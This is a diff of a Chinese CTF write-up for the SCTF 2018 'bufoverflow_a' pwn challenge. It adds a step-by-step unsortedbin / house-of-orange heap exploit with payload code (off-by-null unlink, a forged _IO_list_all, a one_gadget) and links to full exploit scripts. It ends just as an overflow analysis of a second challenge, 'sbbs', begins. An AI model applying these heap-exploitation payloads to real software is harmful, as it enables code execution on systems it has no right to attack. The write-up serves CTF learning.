@@ -7,9 +7,9 @@
 ![vul](https://raw.githubusercontent.com/fade-vivida/CTF/master/sctf2018/pwn/picture/buf_a_vul.JPG)  
 
 ## 2.利用思路 ##
+这道题目可以采用两种解法：largebin attack 和 unsortedbin attack  
 
-这道题目可以利用Largebin Attack ， Unsortedbin Attack（利用这种方法有两种模式）来解决。本文重点介绍Largebin Attack利用方法，在最后的利用脚本中会给出另外两种方法的脚本。
-
+下面着重介绍largebin attack的方法，之后会附带介绍unsortedbin attack攻击流程。
 ### 2.1 leak libc address ###
 老方法，申请一个大于fastbin的chunk，然后将其释放。
 ### 2.2 leak heap address ###
@@ -163,6 +163,68 @@ fastbin attack的攻击过程如下所示：
 ## 3.exploit代码 ##
 Largebin Attack 利用脚本：  
 [https://github.com/fade-vivida/CTF/blob/master/sctf2018/pwn/bufoverflow_a/cd4fc378-7ede-4d78-b4ac-95613fbd0120/largebin_attack.py](https://github.com/fade-vivida/CTF/blob/master/sctf2018/pwn/bufoverflow_a/cd4fc378-7ede-4d78-b4ac-95613fbd0120/largebin_attack.py)
+## 4.unsortedbin attack ##
+利用 unsortedbin attack 进行 house of orange 攻击，其利用思路与其他题目类似，这道题目的重点是如何控制 unsortedbin 出现的时机，因为这道题目比较特殊，当申请多于两个的 chunk 后，再次 malloc chunk 或者 free chunk ，会对chunk内容进行清0xcc，这样如果我们造成overlap chunk后，想要释放它，则会对该chunk所包含的子chunk形成破坏。
 
-Unsortedbin Attack 利用脚本：  
+因此，本题目采用了如下所示方法进行堆布局：
 
+	Alloc(0x100)	#0
+	Alloc(0x108)	#1
+	Alloc(0xf0)		#2
+	Alloc(0x100)	#3
+
+	Delete(1)
+	Alloc(0x108)	#1
+	fake_fd = heap_addr - 0x18 + 0x18
+	fake_bk = heap_addr - 0x10 + 0x18
+
+	payload = p64(0) + p64(0x101) + p64(fake_fd) + p64(fake_bk)
+	payload = payload.ljust(0x100,'\x00')
+	payload += p64(0x100)
+	Fill(payload)
+
+	Delete(2)
+首先申请4个chunk，释放1后再申请回来，并对chunk 1进行填充，形成对chunk 2的off by null。紧接着释放chunk 2，触发前向unlink。
+
+	Alloc(0x1f0)	#2
+	payload = p64(0x21)*0x3e
+	Fill(payload)
+然后再次申请size(chunk1)-0x10 + size(chunk2)+0x10大小的chunk，就可以将刚才释放的chunk再次分配回来（此时该chunk标号为chunk2），并进行填充（这一步填充的目的是为了之后释放伪造chunk绕过检查）。
+
+	Delete(1)
+	Delete(0)
+	Alloc(0x210)	#0
+	payload = '\x00'*0x110 + p64(0) + p64(0x91) + p64(0x21)*30
+	Fill(payload)
+然后释放chunk0，chunk1，两个chunk进行了合并，然后再次申请0x210大小的chunk，就可以吧chunk0+chunk1再次分配回来（此时该chunk标号为chunk0），并对其进行填充。这里需要注意的一点就是，此时chunk2的部分内容已被包含在chunk0中，因此我们可以通过修改chunk0内容对chunk2的头部进行改写（将其大小进行改写：0x201 --> 0x91）。
+
+	Delete(3)
+	Delete(2)
+	Alloc(0x88)		#1
+接着释放chunk3，chunk2，由于chunk2大小已经被我们改小，因此不会与chunk3进行合并。再次申请0x88大小的chunk，将刚才释放的chunk2再次分配回来（此时该chunk标号为chunk1）。
+
+**关键点：为什么我们要这么辛苦的不断释放又申请chunk呢？其目的就是为了减少当前已经申请的chunk数量，使其小于2，满足不填充的malloc分支，而不是calloc分支。** 
+
+此时我们可以发现，当前堆空间中，只有chunk0和chunk1，因此当运行Alloc(0x88)这句代码是，调用mallopt函数的第二个参数为0x0，再之后进行chunk free操作时，不会对chunk内容进行填充（0xcc）。
+
+	Delete(0)
+	Delete(1)
+	Alloc(0x210)
+	_IO_list_all = libc.symbols['_IO_list_all']
+	jump_table_addr = libc.symbols['_IO_file_jumps'] + 0xc0
+	one_gadget = libc.address + 0x3f52a
+	payload = p64(0)*34 + p64(0) + p64(0x61) + p64(0) + p64(_IO_list_all-0x10) + p64(2) + p64(3)
+	payload += (0xd8 - 6*8) * '\x00'
+	payload += p64(jump_table_addr)
+	payload += p64(one_gadget)
+	Fill(payload)
+下面的步骤就是正常的如何伪造unsortedbin，不再进行赘述。
+## 5.unsortedbin attack 代码##
+unsortedbin attack利用脚本
+
+[https://github.com/fade-vivida/CTF/blob/master/sctf2018/pwn/bufoverflow_a/cd4fc378-7ede-4d78-b4ac-95613fbd0120/unsortedbin_attack.py](https://github.com/fade-vivida/CTF/blob/master/sctf2018/pwn/bufoverflow_a/cd4fc378-7ede-4d78-b4ac-95613fbd0120/unsortedbin_attack.py)
+# sbbs #
+## 1.题目分析 ##
+通过分析程序发现，程序login函数中存在缓冲区溢出漏洞，程序本意是允许用户输入8字节的用户名，但在真正输入过程中，read\_buff函数的第2个参数错误给成了0x10，导致其可以覆盖之后的一个指针变量，而这个指针变量原来的值时用来保存登录用户类型的地址。因此造成了任意地址写固定值的漏洞。
+
+## 2.漏洞利用 ##
